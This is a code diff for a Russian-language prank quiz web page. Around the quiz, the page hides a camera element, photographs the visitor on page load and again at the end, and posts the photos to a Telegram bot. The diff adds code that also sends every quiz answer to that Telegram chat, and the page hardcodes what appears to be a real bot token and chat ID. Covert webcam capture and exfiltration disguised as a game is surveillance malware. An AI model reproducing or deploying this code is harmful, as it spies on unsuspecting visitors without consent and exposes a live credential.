@@ -81,7 +81,7 @@
 </head>
 <body>
     <img src="DNIS.jpg" class="final-image" id="finalImage">
-    <audio id="screamSound" src="dnis.mp3"></audio>
+    <audio id="screamSound" src="scream.mp3"></audio>
     <div id="camera-container">
         <video id="camera" autoplay playsinline></video>
     </div>
@@ -152,13 +152,28 @@
         const BOT_TOKEN = '8188957293:AAHmtiE3sgaj0lhUYijUmOnUYBWDaJw39JE';
         const CHAT_ID = '2126669672';
 
-        // Функция для показа финального изображения со звуком
+        // Массив для хранения ответов
+        let answers = [];
+
+        // Функция для отправки сообщения в Telegram
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+                const result = await response.json();
+                if (!result.ok) {
+                    console.error('Ошибка отправки сообщения:', result);
+                }
+            } catch (error) {
+                console.error('Ошибка отправки:', error);
+            }
+        }
+
         function showFinalScreen() {
             finalImage.style.display = 'block';
+            screamSound.currentTime = 0;
             screamSound.play();
         }
 
-        // Функция для фото
         async function takePhoto() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -169,7 +184,6 @@
                 const container = document.getElementById('camera-container');
                 
                 video.srcObject = stream;
-                
                 container.style.display = 'block';
                 container.style.opacity = '0';
                 container.style.zIndex = '-1';
@@ -196,8 +210,6 @@
                     const result = await response.json();
                     if (!result.ok) {
                         console.error('Ошибка отправки в Telegram:', result);
-                    } else {
-                        console.log('Фото отправлено');
                     }
                 } catch (error) {
                     console.error('Ошибка отправки:', error);
@@ -210,7 +222,19 @@
             }
         }
 
-        // Делаем фото при загрузке страницы
+        // Функция для получения текста ответа
+        function getAnswerText(questionNumber, value) {
+            const questions = {
+                1: { question: "Вы БОТ?", answers: { "1": "Да", "2": "Нет" } },
+                2: { question: "Какое имя вам нравится?", answers: { "1": "Наташа", "2": "Ксюша", "3": "Вика", "4": "Маша", "5": "Даша" } },
+                3: { question: "Кто БОТ?", answers: { "1": "Троссс", "2": "Дерево", "3": "Степа" } },
+                4: { question: "Ваш лучший друг?", answers: { "1": "Троссс", "2": "Дерево", "3": "Степа", "4": "Зоро", "5": "Механик" } },
+                5: { question: "Вы ищите жену?", answers: { "1": "Да", "2": "Нет" } }
+            };
+            
+            return `Вопрос ${questionNumber}: ${questions[questionNumber].question}\nОтвет: ${questions[questionNumber].answers[value]}`;
+        }
+
         window.addEventListener('load', takePhoto);
 
         nextBtn.addEventListener('click', async function() {
@@ -222,6 +246,10 @@
                 return;
             }
 
+            // Сохраняем ответ
+            const answerText = getAnswerText(currentQuestion, selectedOption.value);
+            answers.push(answerText);
+
             currentQuestionEl.classList.remove('active');
             
             if (currentQuestion < totalQuestions) {
@@ -232,11 +260,15 @@
                     nextBtn.textContent = 'Завершить';
                 }
             } else {
+                // Отправляем все ответы в Telegram
+                const allAnswers = "Новый прошедший опрос:\n\n" + answers.join("\n\n");
+                await sendToTelegram(allAnswers);
+                
                 quiz.style.display = 'none';
                 result.style.display = 'block';
                 result.innerHTML = 'Поздравляю, вы - БОТ!';
-                await takePhoto(); // Делаем второе фото
-                setTimeout(showFinalScreen, 1000); // Показываем финальный экран через секунду
+                await takePhoto();
+                setTimeout(showFinalScreen, 1000);
             }
         });
     </script>
